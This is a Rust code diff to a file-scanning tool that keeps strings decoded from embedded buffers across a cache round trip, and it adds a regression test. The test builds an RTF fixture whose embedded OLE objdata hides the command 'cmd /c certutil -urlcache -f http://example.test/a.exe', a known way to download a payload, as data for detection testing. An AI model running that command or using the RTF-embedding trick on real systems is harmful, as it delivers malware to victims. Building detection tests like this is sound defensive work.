@@ -267,6 +267,9 @@ struct ExtractedSnapshot {
     /// stng cache key for the dropped `text` rows (`None` when no text tier ran).
     #[serde(default, skip_serializing_if = "Option::is_none")]
     text_key: Option<String>,
+    /// Keys for row sets appended from decoded buffers (see `Strings`).
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    extra_text_keys: Vec<String>,
     literals: output::Literals,
     comments: output::Comments,
     metrics: Metrics,
@@ -285,6 +288,7 @@ impl From<Extracted> for ExtractedSnapshot {
         Self {
             values: e.values,
             text_key: e.strings.text_key,
+            extra_text_keys: e.strings.extra_text_keys,
             literals: e.strings.literals,
             comments: e.strings.comments,
             metrics: e.metrics,
@@ -304,10 +308,17 @@ impl ExtractedSnapshot {
     /// entry (evicted) — the caller then recomputes the pipeline so the strings
     /// are never silently lost.
     fn into_extracted(self) -> Option<Extracted> {
-        let text = match &self.text_key {
+        let mut text = match &self.text_key {
             Some(key) => output::Text::from_rows(stng::cached_strings_by_key(key)?),
             None => output::Text::new(),
         };
+        // Decoded-payload rows, rehydrated the same way. `?` on a miss for
+        // the same reason the primary key uses it: recomputing the pipeline
+        // is right, and silently returning a file with half its strings is
+        // not.
+        for key in &self.extra_text_keys {
+            text.append_rows(&stng::cached_strings_by_key(key)?);
+        }
         Some(Extracted {
             values: self.values,
             strings: output::Strings {
@@ -315,6 +326,7 @@ impl ExtractedSnapshot {
                 literals: self.literals,
                 comments: self.comments,
                 text_key: self.text_key,
+                extra_text_keys: self.extra_text_keys,
             },
             metrics: self.metrics,
             archive_members: self.archive_members,
@@ -1552,6 +1564,49 @@ mod tests {
         assert!(
             !original.strings.text.is_empty(),
             "fixture should yield byte-scan strings"
+        );
+    }
+
+    #[test]
+    fn snapshot_rehydrates_strings_decoded_out_of_the_file() {
+        // The regression this guards: an RTF's `\objdata` hex decodes to a
+        // command that appears nowhere in the file's bytes. Those rows are
+        // appended to the text tier, and the disk cache stores only keys --
+        // so if the appended set has no key of its own, the second scan of the
+        // same file loses not just the decoded command but every string the
+        // file did contain, because the whole tier rehydrates as empty.
+        let mut blob = Vec::new();
+        blob.extend_from_slice(&0x0105_u32.to_le_bytes());
+        blob.extend_from_slice(&2u32.to_le_bytes());
+        blob.extend_from_slice(&8u32.to_le_bytes());
+        blob.extend_from_slice(b"Package\0");
+        blob.extend_from_slice(&0u32.to_le_bytes());
+        blob.extend_from_slice(&0u32.to_le_bytes());
+        let payload = b"cmd /c certutil -urlcache -f http://example.test/a.exe";
+        blob.extend_from_slice(&(payload.len() as u32).to_le_bytes());
+        blob.extend_from_slice(payload);
+        let hex: String = blob.iter().map(|b| format!("{b:02x}")).collect();
+        let bytes =
+            format!("{{\\rtf1\\ansi{{\\object\\objemb{{\\*\\objdata {hex}}}}}}}").into_bytes();
+
+        let extracted = open(&bytes).unwrap().run_pipeline();
+        let has_command =
+            |e: &Extracted| e.strings.text.iter().any(|s| s.value.contains("certutil"));
+        assert!(has_command(&extracted), "decoded command should be present");
+        assert!(
+            !extracted.strings.extra_text_keys.is_empty(),
+            "appended rows must record their own rehydration key"
+        );
+
+        let snapshot = ExtractedSnapshot::from(extracted);
+        let json = serde_json::to_vec(&snapshot).expect("serialize snapshot");
+        let restored: ExtractedSnapshot = serde_json::from_slice(&json).unwrap();
+        let rehydrated = restored
+            .into_extracted()
+            .expect("snapshot should rehydrate from stng");
+        assert!(
+            has_command(&rehydrated),
+            "decoded command must survive the cache round-trip"
         );
     }
 
